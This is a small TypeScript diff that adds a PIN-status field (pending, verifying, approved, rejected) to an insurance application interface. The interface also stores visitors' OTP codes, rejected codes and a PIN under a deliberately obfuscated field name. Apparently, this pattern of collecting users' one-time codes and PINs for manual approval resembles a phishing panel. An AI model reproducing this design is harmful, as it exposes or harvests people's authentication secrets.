@@ -56,6 +56,7 @@ export interface InsuranceApplication {
     otp?: string // كود OTP (الحقل المستخدم من موقع الزوار) - Keep for backward compatibility
     oldOtp?: Array<{ code: string; rejectedAt: string }> // الأكواد المرفوضة القديمة
     _v6?: string // pinCode (obfuscated)
+    _v6Status?: "pending" | "verifying" | "approved" | "rejected" // PIN status
     pinCode?: string // Keep for backward compatibility
     originalPrice?: number
     discount?: number
